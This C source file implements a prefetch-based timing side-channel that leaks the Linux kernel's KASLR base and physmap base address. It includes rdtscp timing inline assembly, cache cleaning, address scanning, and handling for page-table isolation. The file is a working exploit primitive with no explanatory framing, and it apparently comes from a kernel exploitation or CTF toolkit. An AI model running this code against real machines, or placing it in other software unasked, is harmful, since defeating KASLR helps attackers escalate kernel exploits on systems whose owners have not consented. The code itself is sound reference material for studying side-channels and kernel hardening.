#include "kaslr.h"

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "mfence;"
    "prefetcht0 qword ptr [%4];"
    "prefetcht0 qword ptr [%4];"
    "xor rax, rax;"
    "mfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

void clean_cache(size_t base){
    for(int i=0;i<0x100;i++){
        // Access Order
        // int mess = (i*167+13)%0x200; // Makes no diff
        int mess = i;
        char *probe = mess*0x1000+base;
        // prefecth access
        sidechannel(probe);
        // If we don't do clean_cache, we lose some suceess rate
        // Just about 0.8 sec
        // probe = 1;
    }
}


uint64_t leak_syscall_entry(int pti,int boost) 
{
    char *trash = malloc(0x100000);
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
        {
            
            // syscall(0x68);
            // Arbitrary SYSCALL is fine, I use this to avoid accessing other code
            // It should go into syscall and return quickly
            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
            uint64_t time = sidechannel(SCAN_START + idx * STEP);
            if(!boost)
                clean_cache(trash);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }
    int previous_data = data[1];

    if(pti){
        // More analysis for pti
        for(int i = 2; i< ARR_SIZE; i++)
        {
            if(data[i]>previous_data*1.1)
            {
                //outliner
                continue;
            }
            // Find the `dent`
            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && data[i]<min*1.05)
            {
                addr = SCAN_START + i * STEP;
                break;
            }
            previous_data = data[i];
        }
    }
    return addr;
}

size_t leakKASLR(int pti, size_t offset, int boost){
    size_t val = leak_syscall_entry(pti,boost) + offset;
    // No pti so we leaked the address of Kernel Starts instead of entry_SYSCALL_64
    if(!pti) 
        val = val - entry_SYSCALL_64_offset;
    printf ("KASLR  base %llx\n", val);
    return val;
}


uint64_t leak_phys(void) 
{
    uint64_t data[ARR_SIZE_PHYS] = {0};
    uint64_t min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE_PHYS; idx++) 
        {

            uint64_t test = SCAN_START_PHYS + idx * STEP_PHYS;
            syscall(104); 

            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START_PHYS + i * STEP_PHYS;
            // printf("[X] Cur: %p, Pre: %p, Addr: %p\n",data[i],data[i-1],addr);
        }
    }

    int previous_data = data[0x40];

    
        // More analysis for pti
        for(int i = 0x41; i< ARR_SIZE_PHYS; i++)
        {
            if(data[i]>previous_data*1.1)
            {
                //outliner
                continue;
            }
      
            if( data[i]< previous_data && \
                (double)previous_data*0.9375 > (double)data[i] && \
                data[i] < min*1.0625 )
            {
                addr = SCAN_START_PHYS + i * STEP_PHYS;
                break;
            }
            previous_data = data[i];
        }
    
    return addr;
}
size_t leakPHYS(size_t offset){
    size_t val =  leak_phys()-0x100000000;
    printf ("PHYSMAP base %llx\n",val);
    return val;
}

